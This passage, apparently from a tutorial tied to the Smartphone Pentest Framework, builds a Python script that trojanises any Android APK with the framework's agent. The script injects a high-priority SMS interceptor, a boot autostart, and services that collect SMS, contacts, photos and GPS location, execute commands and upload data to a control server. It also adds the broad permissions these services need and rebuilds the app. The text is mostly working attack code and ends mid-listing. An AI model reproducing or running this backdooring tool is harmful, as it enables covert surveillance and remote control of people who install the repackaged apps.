From now on as we continue to build our script, we not only need to delete the MapsDemo folder between runs, but also we need to restore AndroidAgent to its original version before these changes.</p>
<p>The current script is shown here:</p>

<div class="wp_syntax"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
</pre></td><td class="code"><pre class="python"><span>#!/usr/bin/python </span>
<span>import</span> <span>os</span>
<span>import</span> <span>xml</span>.<span>etree</span>.<span>ElementTree</span> <span>as</span> ET
<span>import</span> <span>re</span>
inputfile <span>=</span> <span>raw_input</span><span>(</span><span>'APK to Backdoor: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
apktoolloc <span>=</span> <span>"/root/Smartphone-Pentest-Framework/apktool-install-linux-r05-ibot/apktool"</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + inputfile<span>)</span>
path<span>,</span><span>file</span> <span>=</span> <span>os</span>.<span>path</span>.<span>split</span><span>(</span>inputfile<span>)</span>
foldername <span>=</span> <span>file</span><span>[</span>:-<span>4</span><span>]</span>
ET.<span>register_namespace</span><span>(</span><span>"android"</span><span>,</span> <span>"http://schemas.android.com/apk/res/android"</span><span>)</span>
tree <span>=</span> ET.<span>ElementTree</span><span>(</span><span>)</span>
tree.<span>parse</span><span>(</span>foldername + <span>"/AndroidManifest.xml"</span><span>)</span>
root <span>=</span> tree.<span>getroot</span><span>(</span><span>)</span>
package <span>=</span> root.<span>get</span><span>(</span><span>'package'</span><span>)</span>
<span>print</span> package
<span>for</span> child <span>in</span> root:
     <span>if</span> child.<span>tag</span> <span>==</span> <span>"application"</span>:
          app <span>=</span> child
          <span>for</span> child <span>in</span> app:
               <span>if</span> child.<span>tag</span> <span>==</span> <span>"activity"</span>:
                    act <span>=</span> child
                    <span>for</span> child <span>in</span> act:
                         <span>if</span> child.<span>tag</span> <span>==</span> <span>"intent-filter"</span>:
                              <span>filter</span> <span>=</span> child
                              <span>for</span> child <span>in</span> <span>filter</span>:  
                                   <span>if</span> <span>(</span><span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                        <span>if</span> <span>(</span><span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                             mainact <span>=</span>  act.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span>
					     <span>if</span> mainact<span>[</span><span>0</span><span>]</span> <span>==</span> <span>"."</span>:
                                                  mainact <span>=</span> package + mainact
                                             <span>print</span> mainact
					     act.<span>remove</span><span>(</span><span>filter</span><span>)</span>
                                             tree.<span>write</span><span>(</span><span>"output.xml"</span><span>)</span>
					     <span>break</span>
<span>os</span>.<span>system</span><span>(</span><span>"mv output.xml "</span> + foldername  + <span>"/AndroidManifest.xml"</span><span>)</span>
mainactsplit <span>=</span> mainact.<span>split</span><span>(</span><span>"."</span><span>)</span>
length <span>=</span> <span>len</span><span>(</span>mainactsplit<span>)</span>
classname <span>=</span> mainactsplit<span>[</span>length - <span>1</span><span>]</span>
package <span>=</span> mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"."</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>2</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"."</span>
     package +<span>=</span> add
package +<span>=</span> mainactsplit<span>[</span>length - <span>2</span><span>]</span>
appmain <span>=</span> package + <span>"."</span> + classname + <span>".class"</span>
mainfile <span>=</span> <span>"AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"</span>
inject <span>=</span> <span>"<span>\n</span>        Intent intent2 = new Intent(getApplicationContext(), "</span> + appmain +  <span>");<span>\n</span>startActivity(intent2);<span>\n</span>"</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
     fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
     f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(finish)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
newfolder <span>=</span> <span>"src/"</span> + mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"/"</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>1</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"/"</span>
     newfolder +<span>=</span> add
     <span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span>  
fullclasspath <span>=</span>  <span>"AndroidAgent/"</span> + newfolder + classname + <span>".java"</span>
<span>os</span>.<span>system</span><span>(</span><span>"touch "</span> + fullclasspath<span>)</span>
f <span>=</span> <span>open</span><span>(</span>fullclasspath<span>,</span> <span>'w'</span><span>)</span>
line1 <span>=</span> <span>"package "</span> + package + <span>";<span>\n</span>"</span>
line2 <span>=</span> <span>"import android.app.Activity;<span>\n</span>"</span>
line3 <span>=</span> <span>"public class "</span> + classname + <span>" extends Activity {<span>\n</span>"</span>
line4 <span>=</span> <span>"}<span>\n</span>"</span>
f.<span>write</span><span>(</span>line1<span>)</span>
f.<span>write</span><span>(</span>line2<span>)</span>
f.<span>write</span><span>(</span>line3<span>)</span>
f.<span>write</span><span>(</span>line4<span>)</span>
f.<span>close</span><span>(</span><span>)</span></pre></td></tr></table></div>

<h2>Compiling and Decompiling the Agent Code</h2>
<p>Now we need to build the AndroidAgent project using the Android SDK and Ant. Both of these tools are preinstalled on Kali Linux and are in the path.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span><span>"android update project --name AndroidAgent --path AndroidAgent/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"ant -f AndroidAgent/build.xml clean debug"</span><span>)</span></pre></td></tr></table></div>

<p>Once the AndroidAgent code is compiled we need to decompile it back into Smali code that we can copy into the decompiled MapsDemo. Tell Apktool to decompile into a folder called AndroidAgent2.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d AndroidAgent/bin/AndroidAgent-debug.apk AndroidAgent2/"</span><span>)</span></pre></td></tr></table></div>

<h2>Combining the Two Apps</h2>
<p>Now copy all the Smali code from AndroidAgent2 to the Maps Demo smali folder. Keep in mind that the package path will not necessarily start with com as it does here.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span><span>"mkdir "</span> + foldername + <span>"/smali/com"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"cp -rf AndroidAgent2/smali/com/bulbsecurity "</span> + foldername + <span>"/smali/com/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir "</span> + foldername + <span>"/smali/jackpal"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"cp -rf AndroidAgent2/smali/jackpal "</span> + foldername + <span>"/smali/"</span><span>)</span></pre></td></tr></table></div>

<p>Now we need to add any new interfaces from the backdoor code into MapsDemo’s AndroidManifest.xml. We do this in the same way as we injected code into AndroidAgentActivity.java. Note that we are adding a BroadcastReceiver to intercept incoming SMS messages as described in <a href="http://www.bulbsecurity.com/pivoting-a-shell-through-android-with-sms/">this post</a>. This combined with the relevant permissions which we will add next are enough to put our SMS listener in place.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">manifestfile <span>=</span> foldername + <span>"/AndroidManifest.xml"</span>
inject <span>=</span> <span>"""
        &lt;receiver android:name="com.bulbsecurity.framework.SMSReceiver"&gt;
        &lt;intent-filter android:priority="999"&gt;&lt;action android:name="android.provider.Telephony.SMS_RECEIVED" /&gt;&lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;service android:name="com.bulbsecurity.framework.SMSService"&gt;
        &lt;/service&gt;
        &lt;receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr"&gt;
        &lt;intent-filter &gt;&lt;action android:name="android.intent.action.BOOT_COMPLETED"&gt;&lt;/action&gt;&lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"&gt;&lt;/receiver&gt;
        &lt;service android:name="com.bulbsecurity.framework.CommandHandler"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.PingSweep"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.SMSGet"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.ContactsGet"&gt;
        &lt;/service&gt;
&lt;service android:name="com.bulbsecurity.framework.InternetPoller"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.WebUploadService"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.PictureService"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Download"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Execute"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.GetGPS"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Checkin"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Listener"&gt;&lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Phase1" android:process=":three"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Phase2" android:process=":two"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Exynos"&gt;&lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Upload"&gt;&lt;/service&gt;
&lt;activity android:name="com.bulbsecurity.framework.AndroidAgentActivity"&gt;
        &lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.MAIN" /&gt;
        &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
        &lt;/intent-filter&gt;
        &lt;/activity&gt;
 """</span>
 <span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
      fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
 <span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
      f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;<span>\/</span>application&gt;)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span></pre></td></tr></table></div>

<p>Do the same thing to add any Android permissions the backdoor code uses. With the SPF Agent in the free version of SPF this is currently an all or nothing approach. You get all the permissions for all of the functionality the Android Agent is capable of. If you are building your own backdoor, it would be better to only use the permissions your backdoor code requires to function.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">inject <span>=</span> <span>"""
        &lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;
        &lt;uses-permission android:name="android.permission.INTERNET" /&gt;
        &lt;uses-permission android:name="android.permission.RECEIVE_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.SEND_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.CAMERA"/&gt;
        &lt;uses-permission android:name="android.permission.READ_CONTACTS"/&gt;
        &lt;uses-permission android:name="android.permission.INTERNET"/&gt;
        &lt;uses-permission android:name="android.permission.READ_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt;
        &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;
        &lt;uses-permission android:name="android.permission.READ_PHONE_STATE"/&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
        """</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
     fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
 <span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
     f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;uses-permission)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span></pre></td></tr></table></div>

<p>If you run the script now, look in MapsDemo’s smali folder. You will find jackpal and com/bulbsecurity with the corresponding Smali code.<br/>
<code><br/>
root@kali:~/BackdoorExample/MapsDemo/smali/com/bulbsecurity/framework# ls<br/>
AlarmReceiver.smali            Listener$ServerThread.smali<br/>
AndroidAgentActivity.smali     Listener.smali<br/>
..snip…<br/>
</code><br/>
Also the code has been injected into AndroidManifest.xml.</p>
<p>The SPF Agent stores its global variables such as the phone number of the control modem and the webserver to check in at in the strings.xml file in the res/values directory. In most apps strings.xml will exist already and we can just inject our strings in the usual way. Just in case, we will first check that the file exists. If it does not we will also build the rest of the XML for strings.xml in addition to our string values. The values in the string elements do not matter at this point (leave urii as /control). Next we will prompt the user to fill these in with the right values to meet their needs. More information about these global variables can be found in the SPF Manual <a href="http://www.bulbsecurity.com/smartphone-pentest-framework/spf-user-guide/#SPF_Agents">Agents section</a>.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">stringfile <span>=</span> foldername + <span>"/res/values/strings.xml"</span> 
inject <span>=</span> <span>"""
        &lt;string name="key"&gt;KEYKEY1&lt;/string&gt;
        &lt;string name="controlnumber"&gt;155552155554&lt;/string&gt;
        &lt;string name="controlIP"&gt;192.168.1.108&lt;/string&gt;
        &lt;string name="urii"&gt;/control&lt;/string&gt;
        &lt;string name="controlpath"&gt;/androidagent1&lt;/string&gt;
"""</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>stringfile<span>)</span>:
      <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
           fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
      <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
           f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;<span>\/</span>resources&gt;)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
<span>else</span>:
     inject2 <span>=</span> <span>"""
       &lt;?xml version="1.0" encoding="utf-8"?&gt;
       &lt;resources&gt;
     """</span>
     <span>os</span>.<span>system</span><span>(</span><span>"touch "</span> + stringfile<span>)</span>
     <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
          f.<span>write</span><span>(</span>inject2<span>)</span>  
          f.<span>write</span><span>(</span>inject<span>)</span>
	  f.<span>write</span><span>(</span><span>"&lt;/resources&gt;"</span><span>)</span></pre></td></tr></table></div>

<p>Now we will prompt the user to fill in the global variables with the correct values. Note that in SPF the ControlIP will be filled in automatically from the SPF configuration file instead of prompting the user. Here we prompt the user for the controlIP (IP address where the SPF console is), ControlKey (7 character key to prevent SPF from being hijacked), ControlPath (path on the webserver for HTTP checkin), and ControlPhone (phone number of the <a href="http://www.bulbsecurity.com/smartphone-pentest-framework/spf-user-guide/#Attaching_a_Mobile_Modem">SPF modem</a> that can control the Agent).</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">controlphone <span>=</span> <span>raw_input</span><span>(</span><span>'Phone number of the control modem for the agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlkey <span>=</span> <span>raw_input</span><span>(</span><span>'Control key for the agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlpath <span>=</span> <span>raw_input</span><span>(</span><span>'Webserver control path for agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlip <span>=</span> <span>raw_input</span><span>(</span><span>'Webserver control IP: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span></pre></td></tr></table></div>

<p>Now we need to replace the relevant values in strings.xml with the values the user entered. This time we will use the sed utility.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>key<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>key<span>\"</span>&gt;"</span> + controlkey + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlnumber<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>controlnumber<span>\"</span>&gt;"</span> + controlphone + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlIP<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>controlIP<span>\"</span>&gt;"</span> + ipaddress + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlpath<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>controlpath<span>\"</span>&gt;<span>\\</span>"</span> + controlpath + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span></pre></td></tr></table></div>

<p>Before we compile our backdoored code we need to deal with a small issue in Apktool. From time to time a syntax error is made in the decompiled styles.xml file. What should be @android becomes @*android. Styles.xml does not exist in our case, but since we want to be able to backdoor any APK, we can use the following code to fix this issue before we compile.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">xml_path <span>=</span> foldername + <span>'/res/values/styles.xml'</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>xml_path<span>)</span>:
     tree <span>=</span> ET.<span>parse</span><span>(</span>xml_path<span>)</span>
     <span>for</span> child <span>in</span> tree.<span>findall</span><span>(</span><span>'.//*[@parent]'</span><span>)</span>:
          <span>if</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>startswith</span><span>(</span><span>'@*android:style/'</span><span>)</span>:
               new_parent <span>=</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>replace</span><span>(</span><span>'@*android:style/'</span><span>,</span><span>'@android:style/'</span><span>)</span>
               child.<span>set</span><span>(</span><span>'parent'</span><span>,</span> new_parent<span>)</span>
 
     tree.<span>write</span><span>(</span>xml_path<span>)</span></pre></td></tr></table></div>

<p>Since this is Smali and not Java code, we need to use Apktool to compile. Use the b flag to tell Apktool to build.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" b "</span> + foldername + <span>" "</span> + foldername + <span>".apk"</span><span>)</span></pre></td></tr></table></div>

<p>Now we have a compiled backdoored APK, but as you will see soon, we aren’t quite done. Remove the MapsDemo folder and use Apktool to decompile the backdoored APK back into the folder.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span><span>"rm -rf "</span> + foldername<span>)</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + foldername + <span>".apk "</span> + foldername + <span>"/"</span><span>)</span></pre></td></tr></table></div>

<p>The script up until this point is shown below:</p>

<div class="wp_syntax"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
</pre></td><td class="code"><pre class="python"><span>#!/usr/bin/python </span>
<span>import</span> <span>os</span>
<span>import</span> <span>xml</span>.<span>etree</span>.<span>ElementTree</span> <span>as</span> ET
<span>import</span> <span>re</span>
inputfile <span>=</span> <span>raw_input</span><span>(</span><span>'APK to Backdoor: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
apktoolloc <span>=</span> <span>"/root/Smartphone-Pentest-Framework/apktool-install-linux-r05-ibot/apktool"</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + inputfile<span>)</span>
path<span>,</span><span>file</span> <span>=</span> <span>os</span>.<span>path</span>.<span>split</span><span>(</span>inputfile<span>)</span>
foldername <span>=</span> <span>file</span><span>[</span>:-<span>4</span><span>]</span>
ET.<span>register_namespace</span><span>(</span><span>"android"</span><span>,</span> <span>"http://schemas.android.com/apk/res/android"</span><span>)</span>
tree <span>=</span> ET.<span>ElementTree</span><span>(</span><span>)</span>
tree.<span>parse</span><span>(</span>foldername + <span>"/AndroidManifest.xml"</span><span>)</span>
root <span>=</span> tree.<span>getroot</span><span>(</span><span>)</span>
package <span>=</span> root.<span>get</span><span>(</span><span>'package'</span><span>)</span>
<span>print</span> package
<span>for</span> child <span>in</span> root:
     <span>if</span> child.<span>tag</span> <span>==</span> <span>"application"</span>:
          app <span>=</span> child
          <span>for</span> child <span>in</span> app:
               <span>if</span> child.<span>tag</span> <span>==</span> <span>"activity"</span>:
                    act <span>=</span> child
                    <span>for</span> child <span>in</span> act:
                         <span>if</span> child.<span>tag</span> <span>==</span> <span>"intent-filter"</span>:
                              <span>filter</span> <span>=</span> child
                              <span>for</span> child <span>in</span> <span>filter</span>:  
                                   <span>if</span> <span>(</span><span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                        <span>if</span> <span>(</span><span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                             mainact <span>=</span>  act.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span>
					     <span>if</span> mainact<span>[</span><span>0</span><span>]</span> <span>==</span> <span>"."</span>:
                                                  mainact <span>=</span> package + mainact
                                             <span>print</span> mainact
					     act.<span>remove</span><span>(</span><span>filter</span><span>)</span>
                                             tree.<span>write</span><span>(</span><span>"output.xml"</span><span>)</span>
					     <span>break</span>
<span>os</span>.<span>system</span><span>(</span><span>"mv output.xml "</span> + foldername  + <span>"/AndroidManifest.xml"</span><span>)</span>
mainactsplit <span>=</span> mainact.<span>split</span><span>(</span><span>"."</span><span>)</span>
length <span>=</span> <span>len</span><span>(</span>mainactsplit<span>)</span>
classname <span>=</span> mainactsplit<span>[</span>length - <span>1</span><span>]</span>
package <span>=</span> mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"."</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>2</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"."</span>
     package +<span>=</span> add
package +<span>=</span> mainactsplit<span>[</span>length - <span>2</span><span>]</span>
appmain <span>=</span> package + <span>"."</span> + classname + <span>".class"</span>
mainfile <span>=</span> <span>"AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"</span>
inject <span>=</span> <span>"<span>\n</span>        Intent intent2 = new Intent(getApplicationContext(), "</span> + appmain +  <span>");<span>\n</span>startActivity(intent2);<span>\n</span>"</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
     fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
     f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(finish)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
newfolder <span>=</span> <span>"src/"</span> + mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"/"</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>1</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"/"</span>
     newfolder +<span>=</span> add
     <span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span>  
fullclasspath <span>=</span>  <span>"AndroidAgent/"</span> + newfolder + classname + <span>".java"</span>
<span>os</span>.<span>system</span><span>(</span><span>"touch "</span> + fullclasspath<span>)</span>
f <span>=</span> <span>open</span><span>(</span>fullclasspath<span>,</span> <span>'w'</span><span>)</span>
line1 <span>=</span> <span>"package "</span> + package + <span>";<span>\n</span>"</span>
line2 <span>=</span> <span>"import android.app.Activity;<span>\n</span>"</span>
line3 <span>=</span> <span>"public class "</span> + classname + <span>" extends Activity {<span>\n</span>"</span>
line4 <span>=</span> <span>"}<span>\n</span>"</span>
f.<span>write</span><span>(</span>line1<span>)</span>
f.<span>write</span><span>(</span>line2<span>)</span>
f.<span>write</span><span>(</span>line3<span>)</span>
f.<span>write</span><span>(</span>line4<span>)</span>
f.<span>close</span><span>(</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"android update project --name AndroidAgent --path AndroidAgent/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"ant -f AndroidAgent/build.xml clean debug"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d AndroidAgent/bin/AndroidAgent-debug.apk AndroidAgent2/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir "</span> + foldername + <span>"/smali/com"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"cp -rf AndroidAgent2/smali/com/bulbsecurity "</span> + foldername + <span>"/smali/com/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir "</span> + foldername + <span>"/smali/jackpal"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"cp -rf AndroidAgent2/smali/jackpal "</span> + foldername + <span>"/smali/"</span><span>)</span>
manifestfile <span>=</span> foldername + <span>"/AndroidManifest.xml"</span>
inject <span>=</span> <span>"""
        &lt;receiver android:name="com.bulbsecurity.framework.SMSReceiver"&gt;
        &lt;intent-filter android:priority="999"&gt;&lt;action android:name="android.provider.Telephony.SMS_RECEIVED" /&gt;&lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;service android:name="com.bulbsecurity.framework.SMSService"&gt;
        &lt;/service&gt;
        &lt;receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr"&gt;
        &lt;intent-filter &gt;&lt;action android:name="android.intent.action.BOOT_COMPLETED"&gt;&lt;/action&gt;&lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"&gt;&lt;/receiver&gt;
        &lt;service android:name="com.bulbsecurity.framework.CommandHandler"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.PingSweep"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.SMSGet"&gt;
        &lt;/service&gt;
